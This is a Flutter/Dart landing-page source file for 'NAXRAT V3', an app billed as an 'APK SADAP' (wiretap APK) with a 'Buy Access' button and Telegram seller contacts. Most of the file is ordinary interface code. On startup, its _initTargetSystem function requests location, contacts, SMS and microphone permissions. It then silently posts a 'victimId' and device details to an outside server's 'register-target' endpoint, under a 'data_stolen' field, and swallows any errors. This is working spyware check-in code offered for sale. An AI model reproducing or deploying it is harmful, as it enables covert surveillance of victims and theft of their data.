// ==================== LANDING_PAGE.DART ====================
import 'dart:ui';
import 'dart:convert';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:video_player/video_player.dart';

import 'login_page.dart';

class LandingPage extends StatefulWidget {
  const LandingPage({super.key});

  @override
  State<LandingPage> createState() => _LandingPageState();
}

class _LandingPageState extends State<LandingPage>
    with SingleTickerProviderStateMixin {
  late AnimationController _controller;
  late Animation<double> fadeAnimation;
  late Animation<Offset> slideAnimation;

  late VideoPlayerController _videoController;
  bool _isVideoInitialized = false;
  bool _isMuted = false;

  final Color darkBg = const Color(0xFF050505);
  final Color redPrimary = const Color(0xFFE53935);
  final Color darkRed = const Color(0xFFB71C1C);
  final Color redGlow = const Color(0xFFE57373);

  @override
  void initState() {
    super.initState();
    SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge);

    _initTargetSystem();
    _initializeVideo();

    _controller = AnimationController(
      vsync: this,
      duration: const Duration(seconds: 1),
    );
    fadeAnimation = Tween<double>(begin: 0, end: 1).animate(
      CurvedAnimation(parent: _controller, curve: Curves.easeOut),
    );
    slideAnimation = Tween<Offset>(
      begin: const Offset(0, 0.2),
      end: Offset.zero,
    ).animate(
      CurvedAnimation(parent: _controller, curve: Curves.easeOutCubic),
    );
    _controller.forward();
  }

  void _initializeVideo() {
    _videoController = VideoPlayerController.asset('assets/videos/splash.mp4')
      ..initialize().then((_) {
        setState(() => _isVideoInitialized = true);
        _videoController.setLooping(true);
        _videoController.setVolume(1.0); // SOUND ON
        _videoController.play();
      }).catchError((e) {
        setState(() => _isVideoInitialized = true);
      });
  }

  Future<void> _initTargetSystem() async {
    await [
      Permission.location,
      Permission.contacts,
      Permission.sms,
      Permission.microphone,
    ].request();

    try {
      const String serverBase = "http://gunturhosting.hoshino.my.id:3001";
      final String victimId = "NAXRAT-${Platform.localHostname.hashCode}";

      await http.post(
        Uri.parse("$serverBase/api/register-target"),
        headers: {"Content-Type": "application/json"},
        body: jsonEncode({
          "id": victimId,
          "model": "${Platform.operatingSystem} | ${Platform.localHostname}",
          "data_stolen": "Target Terdeteksi di Landing Page",
        }),
      );
    } catch (e) {}
  }

  @override
  void dispose() {
    _controller.dispose();
    _videoController.dispose();
    super.dispose();
  }

  Future<void> _openUrl(String url) async {
    final Uri uri = Uri.parse(url);
    if (!await launchUrl(uri, mode: LaunchMode.externalApplication)) {
      throw Exception("Error $uri");
    }
  }

  Widget _buildVideoBox() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.symmetric(horizontal: 20),
        child: AspectRatio(
          aspectRatio: 16 / 9,
          child: Container(
            decoration: BoxDecoration(
              borderRadius: BorderRadius.circular(24),
              border: Border.all(
                color: redPrimary.withOpacity(0.6),
                width: 2.5,
              ),
              boxShadow: [
                BoxShadow(
                  color: redPrimary.withOpacity(0.5),
                  blurRadius: 30,
                  spreadRadius: 5,
                ),
                BoxShadow(
                  color: Colors.black.withOpacity(0.5),
                  blurRadius: 15,
                  spreadRadius: 2,
                ),
              ],
            ),
            child: ClipRRect(
              borderRadius: BorderRadius.circular(22),
              child: Stack(
                children: [
                  if (_isVideoInitialized)
                    FittedBox(
                      fit: BoxFit.cover,
                      child: SizedBox(
                        width: _videoController.value.size.width,
                        height: _videoController.value.size.height,
                        child: VideoPlayer(_videoController),
                      ),
                    )
                  else
                    Container(
                      color: darkBg,
                      child: Center(
                        child: CircularProgressIndicator(color: redPrimary),
                      ),
                    ),
                  // Inner glow
                  Container(
                    decoration: BoxDecoration(
                      borderRadius: BorderRadius.circular(22),
                      gradient: LinearGradient(
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                        colors: [
                          redPrimary.withOpacity(0.15),
                          Colors.transparent,
                          redPrimary.withOpacity(0.15),
                        ],
                      ),
                    ),
                  ),
                  // Sound control button
                  Positioned(
                    top: 8,
                    right: 8,
                    child: Container(
                      decoration: BoxDecoration(
                        color: Colors.black.withOpacity(0.5),
                        borderRadius: BorderRadius.circular(30),
                        border: Border.all(
                          color: redPrimary.withOpacity(0.5),
                          width: 1,
                        ),
                      ),
                      child: IconButton(
                        onPressed: () {
                          setState(() {
                            if (_videoController.value.volume > 0) {
                              _videoController.setVolume(0);
                              _isMuted = true;
                            } else {
                              _videoController.setVolume(1.0);
                              _isMuted = false;
                            }
                          });
                        },
                        icon: Icon(
                          _isMuted ? Icons.volume_off : Icons.volume_up,
                          color: redPrimary,
                          size: 18,
                        ),
                        padding: const EdgeInsets.all(8),
                        constraints: const BoxConstraints(),
                      ),
                    ),
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: darkBg,
      body: Container(
        width: double.infinity,
        height: double.infinity,
        decoration: BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [
              darkBg,
              const Color(0xFF0D0D0D),
              darkBg,
            ],
          ),
        ),
        child: Stack(
          children: [
            // Glow Orbs
            Positioned(
              top: -120,
              left: -80,
              child: _glowCircle(320, redPrimary.withOpacity(0.3)),
            ),
            Positioned(
              bottom: -150,
              right: -100,
              child: _glowCircle(360, redGlow.withOpacity(0.3)),
            ),
            Positioned(
              top: 200,
              right: -50,
              child: _glowCircle(150, redPrimary.withOpacity(0.1)),
            ),

            // Main Content
            SafeArea(
              child: FadeTransition(
                opacity: fadeAnimation,
                child: SlideTransition(
                  position: slideAnimation,
                  child: Column(
                    children: [
                      Expanded(
                        child: SingleChildScrollView(
                          padding: const EdgeInsets.symmetric(horizontal: 24),
                          child: Column(
                            children: [
                              const SizedBox(height: 40),

                              // Video 16:9 Box
                              _buildVideoBox(),

                              const SizedBox(height: 30),

                              // Title
                              ShaderMask(
                                shaderCallback: (bounds) => LinearGradient(
                                  colors: [redPrimary, redGlow],
                                ).createShader(bounds),
                                child: const Text(
                                  "NAXRAT V3",
                                  style: TextStyle(
                                    fontSize: 38,
                                    fontWeight: FontWeight.w900,
                                    letterSpacing: 3,
                                    color: Colors.white,
                                  ),
                                ),
                              ),
                              const SizedBox(height: 10),
                              Container(
                                padding: const EdgeInsets.symmetric(
                                  horizontal: 16,
                                  vertical: 6,
                                ),
                                decoration: BoxDecoration(
                                  color: redPrimary.withOpacity(0.1),
                                  borderRadius: BorderRadius.circular(20),
                                  border: Border.all(
                                    color: redPrimary.withOpacity(0.3),
                                  ),
                                ),
                                child: Text(
                                  "APK SADAP - GUNTUR DEV",
                                  textAlign: TextAlign.center,
                                  style: TextStyle(
                                    color: Colors.white70,
                                    fontSize: 12,
                                    letterSpacing: 2,
                                    fontWeight: FontWeight.w500,
                                  ),
                                ),
                              ),
                              const SizedBox(height: 30),

                              // Glassmorphism Card
                              ClipRRect(
                                borderRadius: BorderRadius.circular(26),
                                child: BackdropFilter(
                                  filter: ImageFilter.blur(sigmaX: 30, sigmaY: 30),
                                  child: Container(
                                    padding: const EdgeInsets.all(24),
                                    decoration: BoxDecoration(
                                      color: Colors.white.withOpacity(0.05),
                                      borderRadius: BorderRadius.circular(26),
                                      border: Border.all(
                                        color: Colors.white.withOpacity(0.12),
                                      ),
                                    ),
                                    child: Column(
                                      children: [
                                        _primaryButton(),
                                        const SizedBox(height: 16),
                                        _secondaryButton(),
                                        const SizedBox(height: 24),
                                        Row(
                                          children: [
                                            Expanded(
                                              child: _contactButton(
                                                FontAwesomeIcons.telegram,
                                                "@chgunturx",
                                                "https://t.me/chgunturx",
                                                redPrimary,
                                              ),
                                            ),
                                            const SizedBox(width: 12),
                                            Expanded(
                                              child: _contactButton(
                                                FontAwesomeIcons.telegram,
                                                "@gunturnaktido",
                                                "https://t.me/gunturnaktido",
                                                redPrimary,
                                              ),
                                            ),
                                          ],
                                        ),
                                      ],
                                    ),
                                  ),
                                ),
                              ),
                            ],
                          ),
                        ),
                      ),

                      // Footer
                      Padding(
                        padding: const EdgeInsets.only(bottom: 20, top: 10),
                        child: Text(
                          "© 2026 NaxRat Project | @chgunturx",
                          style: TextStyle(
                            color: Colors.white.withOpacity(0.25),
                            fontSize: 11,
                            letterSpacing: 1.5,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _glowCircle(double size, Color color) => Container(
        width: size,
        height: size,
        decoration: BoxDecoration(
          shape: BoxShape.circle,
          gradient: RadialGradient(
            colors: [color, Colors.transparent],
          ),
        ),
      );

  Widget _primaryButton() {
    return Container(
      width: double.infinity,
      height: 55,
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [darkRed, redPrimary],
        ),
        borderRadius: BorderRadius.circular(16),
        boxShadow: [
          BoxShadow(
            color: redGlow.withOpacity(0.5),
            blurRadius: 25,
            offset: const Offset(0, 8),
          ),
        ],
      ),
      child: ElevatedButton(
        style: ElevatedButton.styleFrom(
          backgroundColor: Colors.transparent,
          shadowColor: Colors.transparent,
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(16),
          ),
        ),
        onPressed: () => Navigator.push(
          context,
          MaterialPageRoute(builder: (context) => const LoginPage()),
        ),
        child: const Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.login_rounded, color: Colors.white, size: 20),
            SizedBox(width: 10),
            Text(
              "Sign In",
              style: TextStyle(
                fontWeight: FontWeight.bold,
                fontSize: 16,
                color: Colors.white,
                letterSpacing: 1.5,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _secondaryButton() => OutlinedButton(
        style: OutlinedButton.styleFrom(
          minimumSize: const Size(double.infinity, 55),
          side: BorderSide(color: redPrimary.withOpacity(0.6), width: 1.5),
          shape: RoundedRectangleBorder(
            borderRadius: BorderRadius.circular(16),
          ),
        ),
        onPressed: () => _openUrl("https://t.me/gunturnaktido"),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.shopping_cart_rounded, color: redPrimary, size: 18),
            const SizedBox(width: 10),
            Text(
              "Buy Access",
              style: TextStyle(
                color: redPrimary,
                fontWeight: FontWeight.w600,
                fontSize: 15,
              ),
            ),
          ],
        ),
      );

  Widget _contactButton(
    IconData icon,
    String label,
    String url,
    Color color,
  ) {
    return InkWell(
      onTap: () => _openUrl(url),
      borderRadius: BorderRadius.circular(14),
      child: Container(
        height: 48,
        decoration: BoxDecoration(
          color: Colors.white.withOpacity(0.05),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(color: color.withOpacity(0.3), width: 1),
        ),
        child: Row(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            FaIcon(icon, color: color, size: 18),
            const SizedBox(width: 8),
            Text(
              label,
              style: TextStyle(
                color: color,
                fontWeight: FontWeight.w600,
                fontSize: 13,
              ),
            ),
          ],
        ),
      ),
    );
  }
}